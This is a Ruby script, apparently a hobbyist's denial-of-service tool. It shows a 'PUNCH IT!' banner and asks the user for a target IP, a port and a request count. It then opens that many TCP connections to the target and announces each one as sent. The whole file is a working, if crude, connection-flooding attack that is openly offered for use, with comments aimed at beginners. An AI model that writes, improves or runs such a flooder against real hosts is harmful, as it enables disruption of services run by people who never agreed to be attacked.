require 'colorize'
require 'socket'
puts "
######  #     # #     #  #####  #     #    ### #######    ###
#     # #     # ##    # #     # #     #     #     #       ###
#     # #     # # #   # #       #     #     #     #       ###
######  #     # #  #  # #       #######     #     #       ###
#       #     # #   # # #       #     #     #     #
#       #     # #    ## #     # #     #     #     #       ###
#        #####  #     #  #####  #     #    ###    #       ###
 ".red
 print "CODED BY ☢POLARSPETROLL☢".blue.bold
puts "
GITHUB : github.com/polarspetroll
INSTAGRAM : @polarspetroll
".green
tryport=0
trytime=0
puts "give me your target ip  :  ".red.bold
      thost=gets.chomp
    puts " give me your target port  : ".blue
           tport=gets.chomp.to_i
      while tport <= 0
        tryport+=1
        break if tryport > 3
          puts "invalid port number ".red.bold
        puts "give me your target port  :  ".green
        tport=gets.chomp.to_i
      end
    if tryport > 3
      abort "its seems that you cant undrstand  we dont have any ports less than 1 and letters , so im gonna go , BYE!!".red
    end

    puts "times of request : ".yellow
    req_time=gets.chomp.to_i
  while req_time <= 0
      trytime += 1
      break if trytime > 3
        puts "invalid requests time (minimum is 1)".red.bold
    puts "times of request : ".yellow
    req_time=gets.chomp.to_i
  end
if trytime > 3
  abort "it seems that you cant undrstand that you cant give me less than one requests , so im gonna leave !! BYE!! :(".red
end
  puts " <==please check your inputs==> : ".green
  puts " host : #{thost}".bold
  puts " port : #{tport}".bold
  puts " req times : #{req_time}".bold
    puts "is it correct ? (Y/n)".yellow
        check=gets.chomp
    checktry=0
    while   check != "Y" or check != "y" or check != "N" or check != "n"
      checktry += 1 #the check var can be mentioned once , but i did it multiple times so its easier to be undrstand for beginners
      if checktry > 3
        abort "dont send me spam !! BYE!! :(".red
      end
      break if check == "Y" or check == "y" or check == "n" or check == "N"

      puts "invalid option for (#{check}) please try with Y/n : ".red
        check=gets.chomp
      end

      if
        check == "Y" or check == "y"
        print "::attack is starting::".red.bold
        def show_wait_cursor(seconds,fps=8)
          chars = %w[| / - \\]
          delay = 0.7/fps
          (seconds*fps).round.times{ |i|
            print chars[i % chars.length].magenta
            sleep delay
            print "\b"
          }
        end

        show_wait_cursor(3)

      elsif check == "n" or check == "N"
        abort "please run the script one more time and correct the inputs :)".magenta.bold
end
puts " "

    begin
         req_time.times {

      socket = TCPSocket.new(thost, tport)
      "==>".each_char do  |c|
        sleep 0.07
        print c
      end
puts "  !Req sent!".bold.red
sleep 0.07


}
rescue
  puts "Error : host maybe down or the selected port is closed!! ".bold.green
    exit
  end
puts " all done ! im gonna sleep ! Bye :)".blue + " <==".white
